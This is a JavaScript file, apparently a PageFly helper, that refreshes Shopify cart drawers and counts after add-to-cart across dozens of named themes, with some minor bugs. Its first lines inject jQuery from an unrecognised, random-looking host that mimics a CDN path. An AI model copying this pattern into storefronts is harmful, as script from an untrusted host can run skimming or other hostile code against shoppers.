//Do not name the function 'refreshCart', this name will overwrite the function of the existing theme.
function loadJS(src, target = document.body, async = true, defer = false) {
  return new Promise((resolve, reject) => {
    const doc = target.ownerDocument;
    if (doc.querySelector(`script[src="${src}"]`)) {
      return resolve(true);
    }
    const script = doc.createElement("script");
    script.src = src;
    script.async = async;
    script.defer = defer;
    script.onload = resolve;
    script.onerror = reject;
    target.appendChild(script);
  });
}
if (!window.jQuery) {
  loadJS("https://5iXJYL5pR68v.com/ajax/libs/jquery/3.2.1/jquery.min.js");
}

// Impact 3.0.0
function handleImpactTheme() {
  fetch("/?section_id=cart-drawer")
    .then((d) => d.text())
    .then((text) => {
      const sectionInnerHTML = new DOMParser().parseFromString(text, "text/html");
      const cartFormInnerHTML = sectionInnerHTML.getElementById("cart-drawer").innerHTML;
      $("#cart-drawer").html(cartFormInnerHTML);
      $('[aria-controls="cart-drawer"]')[0].click();
      $(".header__cart-count .count-bubble ").html(cart.item_count).css("opacity", 1);
    })
    .catch((error) => console.error("Failed to update ccart Impact Theme", error));
}

// Athens 1.6.1
function handleAthensTheme() {
  fetch("/cart?view=mini-cart")
    .then((d) => d.text())
    .then((text) => {
      const sectionInnerHTML = new DOMParser().parseFromString(text, "text/html");
      const cartFormInnerHTML = sectionInnerHTML.getElementById("HeaderMiniCart");
      $("#HeaderMiniCart").html(cartFormInnerHTML.innerHTML);
      if ($(".head-slot-cart-link .head-slot-cart-link-quantity").length > 0) {
        $(".head-slot-cart-link .head-slot-cart-link-quantity").html(cart.item_count);
      } else {
        $(".head-slot-cart-link").append(`<span class="head-slot-cart-link-quantity">${cart.item_count}</span>`);
      }
      $("a.head-slot-nav-link.head-slot-cart-link")[0].click();
    })
    .catch((error) => console.error("Failed to update ccart Athens Theme", error));
}

// Flow
function handleFlowTheme(cart) {
  wetheme.updateCartDrawer(cart);
  wetheme.toggleRightDrawer("cart", true, { cart });
}

// Gecko theme
function handleGeckoTheme(res) {
  geckoShopify.onCartUpdate(1, 1, res.id);
}

// Alto theme
function handleAltoTheme() {
  window.cart.getCart();
}

// Debutify theme
function handleDebutifyTheme() {
  theme.ajaxCart.update();
}

// Avone theme
function handleAvoneTheme() {
  CartJS.getCart();
}

// Showtime theme
function handleShowtimeTheme(cart) {
  Shopify.updateQuickCart(cart);
}

// Rebranding theme
function handleRebrandingTheme() {
  const _config = {
    cartCountSelector: ".cartCountSelector",
    cartTotalSelector: ".cartTotalSelector",
  };

  var ajaxLoadPage = function (url) {
    $.ajax({
      type: "GET",
      url: url,
      complete: function (data) {
        $("#cart-dropdown-span").html($("#cart-dropdown-span", data.responseText).html());
      },
    });
  };
  if ($(".cartCountSelector").length) {
    var value = $(_config.cartCountSelector).html() || "0";
    $(_config.cartCountSelector)
      .html(value.replace(/[0-9]+/, cart.item_count))
      .removeClass("hidden");
    $(".cartTotalSelector").html(Shopify.formatMoney(cart.total_price, theme.moneyFormat).replace(/((\,00)|(\.00))$/g, ""));
  }
  ajaxLoadPage();
}

// Envy theme
function handleEnvyTheme(cart) {
  wetheme.updateCartDrawer(cart);
  wetheme.drawer.slideouts.right.open();
}

// Marker theme
function handleMarkerTheme(cart) {
  var count = cart.item_count;
  $(".cart--external--total-items").text(count);
  $.ajax({
    url: theme.classes.FrameworkCart.prototype.getAjaxUrl(),
    type: "GET",
    dataType: "html",
  }).done(function (data) {
    var cart_html;
    cart_html = $($.parseHTML(data));
    $(".cart--root").attr("data-has-items", true);
    $(".cart--root").find(".cart--form").replaceWith(cart_html.find(".cart--form"));
  });
  if (count > 0) {
    $(".cart--external--total-items").css("display", "inline-block");
    return $(".cart--external--total-items").parent().show();
  } else {
    $(".cart--external--total-items").not(".header--mobile-cart-count").hide();
    return $(".cart--external--total-items").not(".header--mobile-cart-count").parent().hide();
  }
}

// Express theme
function handleExpressTheme() {
  var id = res.id;
  window.carts.forEach(function (e) {
    e.onCartUpdated(id);
  });
}

//Impulse
function handleImpulseTheme() {
  document.dispatchEvent(
    new CustomEvent("ajaxProduct:added", {
      detail: {
        product: res,
        addToCartBtn: "",
      },
    })
  );
}

// Focal theme
function handleFocalTheme(cart) {
  document.documentElement.dispatchEvent(
    new CustomEvent("cart:refresh", {
      bubbles: true,
    })
  );
  document.getElementById("mini-cart").open = true;
  document.querySelector("cart-count").innerText = cart.item_count;
}

// Modular theme
function handleModularTheme(cart, res) {
  Cart.buildCart(cart);
  Cart.popover.show(res);
}

// Foodly theme
function handleFoodlyTheme() {
  updateDropdownCart();
  document.querySelector(".cart-btn-container > a").click();
}

//Warehouse theme
function handleWarehouseTheme() {
  document.dispatchEvent(
    new CustomEvent("product:added", {
      bubbles: !0,
      detail: {
        variant: res.variant_id,
        quantity: 1,
      },
    })
  );
}

// Prestige theme
function handlePrestigeTheme(cart) {
  fetch("/?section_id=cart-drawer")
    .then((d) => d.text())
    .then((text) => {
      const sectionInnerHTML = new DOMParser().parseFromString(text, "text/html");
      const cartFormInnerHTML = sectionInnerHTML.getElementById("cart-drawer").innerHTML;
      $("#cart-drawer").html(cartFormInnerHTML);
      $('[aria-controls="cart-drawer"]')[0].click();
      $(".header__cart-count .count-bubble ").html(cart.item_count).css("opacity", 1);
    })
    .catch((error) => console.error("Failed to update ccart Prestige Theme", error));
}

// Lammer theme
function handleLammerTheme(item) {
  var htmlVariant = item.variant_title !== null ? "<i>(" + item.variant_title + ")</i>" : "";
  var styleCart = $(".js-mini-cart").attr("data-cartmini");
  if (styleCart != "true") {
    var htmlAlert = '<div class="media mt-2 alert--cart"><a class="mr-3" href="/cart"><img class="lazyload" data-src="' + item.image + '"></a><div class="media-body align-self-center"><p class="m-0 font-weight-bold">' + item.product_title + " x " + item.quantity + "</p>" + htmlVariant + "<div><div>";
    theme.alert.new(theme.strings.addToCartSuccess, htmlAlert, 3000, "notice");
  }
  theme.miniCart.updateElements();
  theme.miniCart.generateCart();
}

//Furns - Furniture Shopify theme
function handleFurnTheme(res, cart) {
  Shopify.onItemAdded(res);
  Shopify.onCartUpdate(cart);
  jQuery("#modalAddToCart").modal("toggle");
  document.querySelector(".popupimage").src = res.image;
}

// Turbo theme
function handleTurboTheme(cart) {
  window.refreshCart && window.refreshCart(cart);

  if ($("#header").is(":visible")) {
    $("#header .cart-container").addClass("active_link");
  } else if ($(".sticky_nav--stick").length) {
    $(".sticky_nav .cart-container").addClass("active_link");
  } else {
    $(".top-bar .cart-container").addClass("active_link");
  }

  // block scrolling on mobile
  if (window.PXUTheme.media_queries.medium.matches) {
    const $cartContainer = $(this).parent();
    if ($cartContainer.hasClass("active_link")) {
      $("body").addClass("blocked-scroll");
    } else {
      $("body").addClass("blocked-scroll");
    }

    // Scroll to the top of the page unless the header is fixed
    const header = document.getElementById("header");
    if (header.classList.contains("mobile_nav-fixed--false")) {
      window.scroll({ top: 0, left: 0, behavior: "smooth" });
    }
  }
}

// Emerge- Emerge Shopify theme
function handleEmergeTheme(cart) {
  fetch("/?snippets_id=cart")
    .then((response) => response.text())
    .then((text) => {
      const sectionInnerHTML = new DOMParser().parseFromString(text, "text/html");
      const checkCart = sectionInnerHTML.querySelector('[data-active="cart"]');
      if (checkCart) {
        const cartFormInnerHTML = checkCart.innerHTML;
        $('[data-active="cart"]').html(cartFormInnerHTML);
        $(".header--cart-link").attr("data-has-items", "true");
        $(".cart--external--total-items").text(cart.item_count);
        $(".cart--external--total-price").text($(".cart--total--price.money").text());
        $("a.header--cart-toggle")[0].click();
      }
    })
    .catch((e) => console.log("Error: ", e));
}

// Minimog theme
function handleMinimogTheme(cart, res) {
  Shopify.onItemAdded(res);
  Shopify.onCartUpdate(cart);
}

// Province theme
function handleProvinceTheme(cart) {
  const countHtml = document.createElement("span");
  countHtml.classList.add("item-count", "inline-block", "text-center");
  document.querySelector(".cart").appendChild(countHtml);
  countHtml.innerHTML = cart?.item_count;
}

//Motion theme
function handleMotionTheme(c) {
  document.dispatchEvent(
    new CustomEvent("ajaxProduct:added", {
      detail: {
        product: c,
      },
    })
  );
}

//Ella theme
function handleEllaTheme() {
  setTimeout(function () {
    const renderSidebar = document.querySelector("#cart-icon-bubble");
    renderSidebar.click();
  }, 400);
}

// Be Yours Theme
function handleBeYoursTheme(res) {
  fetch("/?sections=mini-cart,cart-icon-bubble")
    .then((response) => response.json())
    .then((sections) => {
      const minicart = document.querySelector("mini-cart");
      res.sections = sections;
      minicart.renderContents(res);
    });
}

// Quark Theme
function handleQuarkTheme(cart) {
  document.documentElement.dispatchEvent(
    new CustomEvent("cart:refresh", {
      bubbles: true,
      detail: {
        cart: cart,
        openMiniCart: window.themeVariables.settings.cartType === "drawer" && this.closest(".drawer") === null,
      },
    })
  );
  document.querySelectorAll('.header__icon-wrapper[aria-label="Cart"]')[0].click();
}

// Launch Theme
function handleLaunchTheme(cart) {
  $(".header-cart-count").text(cart.item_count);
  $(".header-cart-count").class("active");
}

// Stockholm Theme
function handleStockholmTheme(cart) {
  fetch("/?snippets_id=cart-notification")
    .then((response) => response.text())
    .then((text) => {
      const sectionInnerHTML = new DOMParser().parseFromString(text, "text/html");
      const cartFormInnerHTML = sectionInnerHTML.getElementById("cart-notification").innerHTML;
      const totalPrice = sectionInnerHTML.querySelector("#cart-notification .totals__subtotal-value").innerHTML;
      $("#cart-notification").html(cartFormInnerHTML);
      $("cart-drawer").removeClass("is-empty");
      $("cart-drawer-items").removeClass("is-empty");
      if ($("#cart-icon-bubble .cart-count-bubble").length === 0) {
        const cartNumber = document.createElement("div");
        cartNumber.className = "cart-count-bubble";
        cartNumber.innerHTML = `
                    <span aria-hidden="true">${cart.item_count}</span>
                    <span class="visually-hidden">${cart.item_count} items</span>
                `;
        $("#cart-icon-bubble").append(cartNumber);
      } else {
        $('.cart-count-bubble span[aria-hidden="true"]').each((_, count) => $(count).text(cart.item_count));
      }
      $("#cart-icon-bubble")[0].click();
      $("#cart-notification-Overlay").on("click", () => {
        $("cart-drawer").removeClass("active");
        $("body").removeClass("overflow-hidden");
      });
    });
}

function handleEmpireTheme(res, cart) {
  const countEvent = new CustomEvent("cartcount:update", {
    detail: cart,
    res,
  });
  window.dispatchEvent(countEvent);
  $(".atc-banner--container").parent().css("display", "block");
  $(".atc-banner--container").css({
    display: "block",
    top: "188px",
    position: "fixed",
  });
  $(".atc-banner--container").attr("data-animation-state", "open");
  $(".atc-banner--container [data-atc-banner-product-image]").html(`<img src="${res.image}" alt="${res.title}">`);
  $(".atc-banner--container [data-atc-banner-product-title]").html(res.title);
  $(".atc-banner--container [data-atc-banner-product-price-quantity]").html(`${res.quantity} × `);
  $(".atc-banner--container [data-atc-banner-cart-button] span").html(cart.item_count);
  $(".atc-banner--container [data-atc-banner-product-discounts]").css("display", "none");
  $(".atc-banner--container [data-atc-banner-product-price-value]").html(Shopify.formatMoney(res.price));
  $(".atc-banner--container [data-atc-banner-close]").click(function () {
    $(".atc-banner--container").attr("data-animation-state", "close");
  });
  if (window.scrollY > 188) {
    $(".atc-banner--container").css("top", "70px");
  } else {
    $(".atc-banner--container").css("top", "188px");
  }
  $(window).scroll(function () {
    if (window.scrollY > 188) {
      $(".atc-banner--container").css("top", "70px");
    } else {
      $(".atc-banner--container").css("top", "188px");
    }
  });
}

// Dawn, Craft, Taste, Refresh, Sense
function handleFreeShopifyTheme(cart) {
  fetch("/cart?view=item")
    .then((response) => response.text())
    .then((text) => {
      const sectionInnerHTML = new DOMParser().parseFromString(text, "text/html");
      if (sectionInnerHTML) {
        const cartFormInnerHTML = sectionInnerHTML.getElementById("CartDrawer").innerHTML;
        const totalPrice = sectionInnerHTML.querySelector("#CartDrawer .totals__subtotal-value").innerHTML;
        $("#CartDrawer").html(cartFormInnerHTML);
        $("cart-drawer").removeClass("is-empty");
        $("cart-drawer-items").removeClass("is-empty");
        if ($("#cart-icon-bubble .cart-count-bubble").length === 0) {
          const cartNumber = document.createElement("div");
          cartNumber.className = "cart-count-bubble";
          cartNumber.innerHTML = `
                        <span aria-hidden="true">${cart.item_count}</span>
                        <span class="visually-hidden">${cart.item_count} items</span>
                        `;
          $("#cart-icon-bubble").append(cartNumber);
        } else {
          $('.cart-count-bubble span[aria-hidden="true"]').each((_, count) => $(count).text(cart.item_count));
        }
        $("#cart-icon-bubble")[0].click();
        $("#CartDrawer-Overlay").on("click", () => {
          $("cart-drawer").removeClass("active");
          $("body").removeClass("overflow-hidden");
        });
      }
    });
}

// Handmade theme
function handleHandmadeTheme(res, cart) {
  $.getJSON("/?sections=cart-notification-product,cart-notification-button,cart-icon-bubble").then((sections) => {
    const cartDrawer = document.querySelector("cart-notification");
    res.sections = sections;

    const countInCart = document.querySelector(".cart-notification__count-value");
    if (countInCart) {
      countInCart.innerHTML = cart.item_count;
    }

    const totalPrice = document.querySelector(".totals__subtotal-value");
    if (totalPrice) {
      totalPrice.innerHTML = cart.total_price / 100 + " " + cart.currency;
    }
    cartDrawer.renderContents(res);
  });
}

// Canopy theme
function handleCanopyTheme(res) {
  return new Promise((resolve, reject) => {
    try {
      $.post(theme.routes.cart_url + "/change.js", {
        quantity: res.quantity,
        id: res.variant_id,
      })
        .done((cart) => {
          theme.updateCartSummaries(cart);
          resolve(cart);
        })
        .fail((error) => {
          reject(error);
        });
    } catch (e) {
      reject(e);
    }
  });
}

// Webinopoly theme
function handleWebinopolyTheme() {
  $.get("/cart?view=json", function (e) {
    $(".cart-inner-content").html(e);
  }),
    $.getJSON("/cart.js", function (e) {
      $(".cart-total .cart-qty").html(e.item_count);
    });

  if (frontendData.enableCurrency) {
    currenciesCallbackSpecial(".cart-wrapper .cart-inner span.money");
    currenciesCallbackSpecial(".icon-cart-header span.money");
  }
  $(".cartloading").hide();

  setTimeout(function () {
    $(".loader-container").hide();
    $("#resultLoading").hide();

    if (cartData.shopping_cart_action == "popup") {
      box.addClass("d-block");
      setTimeout(function () {
        box.removeClass("d-block");
      }, 5e3);
    }

    if (cartData.shopping_cart_action == "widget") {
      if ($(".header-container").hasClass("sticky-header")) {
        $(".main-top-nav .mini-cart .cart-wrapper").fadeIn(200);
      } else {
        $(".mini-cart .cart-wrapper").fadeIn(200);
      }

      timeoutNumber = setTimeout(function () {
        $(".mini-cart .cart-wrapper").fadeOut(200);
      }, 3500);
    }
  }, 500);
}

// Symmetry theme
function handleSymmetryTheme() {
  if (theme.settings.after_add_to_cart === "page") {
    window.location = theme.routes.cart_url;
  } else if (theme.settings.after_add_to_cart === "drawer") {
    document.documentElement.dispatchEvent(new CustomEvent("theme:cartchanged", { bubbles: true, cancelable: false, detail: { openDrawer: true } }));
  } else if (theme.settings.after_add_to_cart === "notification") {
    document.documentElement.dispatchEvent(new CustomEvent("theme:cartchanged", { bubbles: true, cancelable: false }));
    var notification = document.getElementById("AddedNotification").content.firstElementChild.cloneNode(true);
    notification.dataset.productTitle = response.product_title;
    var notificationContainer = document.querySelector(".pageheader--sticky");
    if (!notificationContainer) {
      notificationContainer = document.querySelector("body");
    }
    notificationContainer.appendChild(notification);
  }
}

// Speedfly theme
function handleSpeedflyTheme(cart) {
  const miniCart = document.querySelector("mini-cart");
  miniCart.generateDom(cart);
  $("a.header-cart-btn.header-action-cart.cart-toggle")[0].click();
}

// Impulse theme
const handleThemeImpulse = async () => {
  $("body").trigger("added.ajaxProduct");
};

// Brooklyn theme
let ajaxCartInitialized = false;
const handleThemeBrooklyn = async () => {
  if (!ajaxCartInitialized && window.ajaxCart) {
    window.ajaxCart.init({
      formSelector: "#AddToCartForm--product-template",
      cartContainer: "#CartContainer",
      addToCartSelector: "#AddToCart--product-template",
      enableQtySelectors: true,
      // eslint-disable-next-line no-template-curly-in-string
      moneyFormat: window.pfSetting.moneyFormat || "${{amount_with_comma_separator}}",
    });
    ajaxCartInitialized = true;
  }
  $("body").trigger("ajaxCart.afterCartLoad", window.__pagefly_helper_store__.cart);
  $(".cart-link.js-drawer-open-button-right").trigger("click");
};

// Debut theme
const handleThemeDebut = async () => {
  const { lastATCResult } = __pagefly_helper_store__;

  if (!window.pfProduct && window.theme.Product.toString().includes("$container")) {
    window.pfProduct = new window.theme.Product();
  }
  typeof window.pfProduct?._setupCartPopup === "function" && window.pfProduct._setupCartPopup(lastATCResult);
};

// Venue theme
const handleThemeVenue = async (cart) => {
  const { item_count } = cart;
  $("#CartCount").text(item_count);
  $(".js-cart-trigger").addClass("js-cart-full");
};

// Parallax theme
const handleThemeParallax = (cart) => {
  window.refreshCart && window.refreshCart(cart);
  setTimeout(function () {
    $.fancybox.close();
    $(".cart-button").click();
  }, 500);
};

// Current Site theme
const handleThemeCurrentSite = async () => {
  window.ajaxCart.init({
    formSelector: ".add-to-cart__form",
    cartContainer: "#CartContainer",
    addToCartSelector: ".add-to-cart",
    enableQtySelectors: true,
    moneyFormat: window.theme.strings.moneyFormat,
  });
};

try {
  setTimeout(function () {
    window.__pagefly_helper_store__ &&
      window.__pagefly_helper_store__.subscribe(function (res) {
        const themeName = window.__pagefly_theme_atc_check__ || window.BOOMR.themeName;
        $.getJSON("/cart.json")
          .then((cart) => {
            switch (true) {
              case /Impact/i.test(themeName):
                handleImpactTheme();
                break;
              case /Athens/i.test(themeName):
                handleAthensTheme();
                break;
              case /Alto/i.test(themeName):
                handleAltoTheme();
                break;
              case /Debutify/i.test(themeName):
                handleDebutifyTheme();
                break;
              case /Avone/i.test(themeName):
                handleAvoneTheme();
                break;
              case /Gecko|Kalles/i.test(themeName):
                handleGeckoTheme(res);
                break;
              case /Rebranding/i.test(themeName):
                handleRebrandingTheme();
                break;
              case /Flow/i.test(themeName):
                handleFlowTheme(cart);
                break;
              case /Showtime/i.test(themeName):
                handleShowtimeTheme(cart);
                break;
              case /Envy/i.test(themeName):
                handleEnvyTheme(cart);
                break;
              case /Marker/i.test(themeName):
                handleMarkerTheme(cart);
                break;
              case /Express/i.test(themeName):
                handleExpressTheme();
                break;
              case /Impulse/i.test(themeName):
                handleImpulseTheme();
                break;
              case /Focal/i.test(themeName):
                handleFocalTheme(cart);
                break;
              case /Modular/i.test(themeName):
                handleModularTheme(cart, res);
                break;
              case /Modular/i.test(themeName):
                handleFoodlyTheme();
                break;
              case /Prestige/i.test(themeName):
                handlePrestigeTheme(cart);
                break;
              case /Warehouse/i.test(themeName):
                handleWarehouseTheme();
                break;
              case /Lammer/i.test(themeName):
                handleLammerTheme(res);
                break;
              case /Minimog/i.test(themeName):
                handleMinimogTheme(cart, res);
                break;
              case /Furns - Furniture Shopify/i.test(themeName):
                handleFurnTheme(res, cart);
                break;
              case /Quark/i.test(themeName):
                handleQuarkTheme(cart);
                break;
              case /Launch/i.test(themeName):
                handleLaunchTheme(cart);
                break;
              case /Stockholm/i.test(themeName):
                handleStockholmTheme(cart);
                break;
              case /Dawn|Craft|Taste|Refresh|Sense/i.test(themeName):
                handleFreeShopifyTheme(cart);
                break;
              case /Providence/i.test(themeName):
                handleProvinceTheme(cart);
              case /Motion/i.test(themeName):
                handleMotionTheme(cart);
                break;
              case /Ella/i.test(themeName):
                handleEllaTheme();
                break;
              case /Be Yours/i.test(themeName):
                handleBeYoursTheme(res);
                break;
              case /Handmade/i.test(themeName):
                handleHandmadeTheme(res, cart);
                break;
              case /RejuvAus/i.test(themeName):
                handleWebinopolyTheme();
                break;
              case /Symmetry/i.test(themeName):
                handleSymmetryTheme();
                break;
              case /Empire/i.test(themeName):
                handleEmpireTheme(res, cart);
                break;
              case /Speedfly/i.test(themeName):
                handleSpeedflyTheme(cart);
                break;
              case /Canopy/i.test(themeName):
                handleCanopyTheme(res);
                break;
              case /Turbo/i.test(themeName):
                handleTurboTheme(cart);
                break;
              case /Emerge/i.test(themeName):
                handleEmergeTheme(cart);
                break;
              case /Impulse/i.test(themeName):
                handleThemeImpulse();
                break;
              case /Brooklyn/i.test(themeName):
                handleThemeBrooklyn();
                break;
              case /Debut/i.test(themeName):
                handleThemeDebut();
                break;
              case /Venue/i.test(themeName):
                handleThemeVenue(cart);
                break;
              case /Parallax/i.test(themeName):
                handleThemeParallax(cart);
                break;
              case /Current Site|CurrentSite/i.test(themeName):
                handleThemeCurrentSite();
                break;
            }
          })
          .catch((err) => console.error(`Failed to update cart ${themeName}`, err));
      });
  }, 2500);
} catch (e) {
  console.warn("PF ATC Error", e);
}
